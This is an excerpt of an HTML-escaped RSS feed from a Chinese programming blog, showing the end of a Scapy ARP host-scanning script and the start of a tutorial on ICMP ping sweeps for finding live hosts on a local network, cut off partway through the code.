&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">queue&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">result_list&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">getlayer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ARP&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">fields&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;hwsrc&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># 将数据加入队列&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">queue&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">put&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">result_list&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">getlayer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ARP&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">fields&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;hwsrc&amp;#39;&lt;/span>&lt;span class="p">]))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">except&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">scan&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">network&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">func&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> 扫描主机
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> :param network: 扫描的网段
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> :param func: 扫描调用的函数
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> :return:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">queue&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Queue&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">net&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ipaddress&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ip_network&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">network&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">ip&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">net&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ip&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ip&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">arp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">target&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">func&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ip&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">queue&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="c1"># 创建进程&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">arp&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">start&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1"># 开始进程&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">time&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">successful_mac_list&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">queue&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">empty&lt;/span>&lt;span class="p">():&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ip&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">mac&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">queue&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">successful_mac_list&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">ip&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">mac&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">successful_mac_list&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">network&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">input&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Please enter the network segment to be scanned：&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">start&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">time&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">time&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Start scanning ...&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">active_ip&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">scan&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">network&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">scapy_arp_requests&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Scan complete!&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;The hosts successfully scanned are:&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">ip&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">mac&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">enumerate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">active_ip&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">: IP:&lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2"> -- Mac:&lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ip&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">mac&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">A total of &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2"> addresses were successful!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">active_ip&lt;/span>&lt;span class="p">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">end&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">time&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">time&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;This scan takes a total of &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2"> seconds.&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">end&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">start&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>Scapy编程实例之ping扫描</title><link>https://wlynxg.github.io/blog/p/scapy%E7%BC%96%E7%A8%8B%E5%AE%9E%E4%BE%8B%E4%B9%8Bping%E6%89%AB%E6%8F%8F/</link><pubDate>Fri, 22 Aug 2025 17:34:52 +0800</pubDate><guid>https://wlynxg.github.io/blog/p/scapy%E7%BC%96%E7%A8%8B%E5%AE%9E%E4%BE%8B%E4%B9%8Bping%E6%89%AB%E6%8F%8F/</guid><description>&lt;h1 id="scapy编程实例之ping扫描">Scapy编程实例之ping扫描
&lt;/h1>&lt;h2 id="简述">简述
&lt;/h2>&lt;p>众所周知，我们可以使用 &lt;code>ping&lt;/code> 一个主机地址的方式来判断我们和这个主机之间的网络连接是否是畅通的。&lt;/p>
&lt;p>从另外一个角度思考，只要我们能够 &lt;code>ping&lt;/code> 通一个主机，则说明这个主机是存活的。&lt;/p>
&lt;p>当我们需要知道一个局域网中有哪些主机时，此时就可以使用通过 ping 每个 IP 的方式来找出所有主机。&lt;/p>
&lt;h2 id="ping包">ping包
&lt;/h2>&lt;p>既然我们要构造 ping包,去探测主机那么我们就首先应该知道一个基本的 ping包长什么模样:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">###[ Ethernet ]###&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">dst&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">ff&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">ff&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">ff&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">ff&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">ff&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">ff&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">src&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">b8&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">08&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">cf&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">b4&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">ba&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">e5&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">type&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mh">0x9000&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">###[ ICMP ]###&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">type&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">echo&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">request&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">code&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">chksum&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">id&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mh">0x0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">seq&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mh">0x0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">###[ Raw ]###&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">load&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;xxx&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="ping扫描程序">ping扫描程序
&lt;/h2>&lt;h3 id="1-windows">1. Windows
&lt;/h3>&lt;blockquote>
&lt;p>由于Windows对于进程的管理太鬼畜了,我只能用线程池的方式编写该程序👻&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;span class="lnt">64
&lt;/span>&lt;span class="lnt">65
&lt;/span>&lt;span class="lnt">66
&lt;/span>&lt;span class="lnt">67
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">logging&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">ipaddress&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">multiprocessing&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">random&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">randint&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">scapy.layers.inet&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">IP&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ICMP&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">scapy.sendrecv&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">sr1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">logging&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">getLogger&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;scapy.runtime&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">setLevel&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">logging&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ERROR&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">ping&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">queue&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">None&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> ping一个主机
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> :param host: 主机地址
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> :param queue: 成功时将地址放入该队列
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> :return:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Testing：&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">host&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">id_ip&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">randint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">65535&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">id_ping&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">randint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">65535&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">seq_ping&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">randint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">65535&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pkt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">IP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dst&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">ttl&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">id_ip&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="n">ICMP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">id_ping&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">seq&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">seq_ping&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;I&amp;#39;m a ping packet &amp;#34;&lt;/span> &lt;span class="c1"># 构造ping包&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">reply&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sr1&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pkt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">timeout&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">verbose&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">False&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># 接收一个回复包&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">reply&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;success&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">queue&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">queue&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">put&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">scan&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">network&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sacnFunc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">maxPool&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">maxQueue&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> 对一个局域网进行扫描
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> :param network: 扫描一个局域网
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> :param sacnFunc: 用到的扫描函数
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> :param maxPool: 最大进程数，如果不指定的话为本机CPU数量
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> :param maxQueue: 队列最大数量
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> :return: 返回
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
